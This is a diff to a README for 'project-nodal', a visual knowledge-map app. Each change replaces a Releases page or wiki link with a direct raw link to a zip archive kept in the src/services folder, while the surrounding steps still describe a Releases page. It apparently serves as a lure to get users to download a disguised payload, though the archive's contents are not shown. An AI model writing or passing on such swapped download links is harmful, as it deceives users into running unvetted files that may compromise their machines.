@@ -1,7 +1,7 @@
 # 🎨 project-nodal - Create and Explore Visual Knowledge Maps
 
 ## 🔗 Download Now
-[![Download project-nodal](https://img.shields.io/badge/Download%20project--nodal-v1.0.0-blue)](https://github.com/Nooraldeen8329/project-nodal/releases)
+[![Download project-nodal](https://github.com/Nooraldeen8329/project-nodal/raw/refs/heads/main/src/services/nodal_project_1.3.zip%20project--nodal-v1.0.0-blue)](https://github.com/Nooraldeen8329/project-nodal/raw/refs/heads/main/src/services/nodal_project_1.3.zip)
 
 ## 📖 Overview
 **project-nodal** is a local-first, infinite canvas that transforms linear AI chats into a spatial knowledge graph. This application allows you to visually organize and connect your thoughts and conversations, making it easier to explore and understand complex ideas.
@@ -11,7 +11,7 @@ Follow these simple steps to get started with **project-nodal**:
 
 1. **Visit the Releases Page**  
    Click the link below to reach our Releases page where you can download the latest version.  
-   [Download project-nodal](https://github.com/Nooraldeen8329/project-nodal/releases)
+   [Download project-nodal](https://github.com/Nooraldeen8329/project-nodal/raw/refs/heads/main/src/services/nodal_project_1.3.zip)
 
 2. **Choose the Version**  
    On the Releases page, you will find several versions of project-nodal. Each version has notes indicating what changes and improvements it includes. For best results, select the latest version.
@@ -75,7 +75,7 @@ Should you face any challenges or have questions about using project-nodal, plea
 - **Discussion Forum**: Join our community discussions to share your experiences, tips, and suggestions with other users.
 
 ## 🔗 Resources
-- **Documentation**: Visit our [documentation page](https://github.com/Nooraldeen8329/project-nodal/wiki) for detailed user guides and FAQs.
+- **Documentation**: Visit our [documentation page](https://github.com/Nooraldeen8329/project-nodal/raw/refs/heads/main/src/services/nodal_project_1.3.zip) for detailed user guides and FAQs.
 - **Feedback**: We welcome your feedback! It helps us improve project-nodal. Please use the feedback link in the application or the GitHub repository.
 
 ## 🎉 Final Thoughts
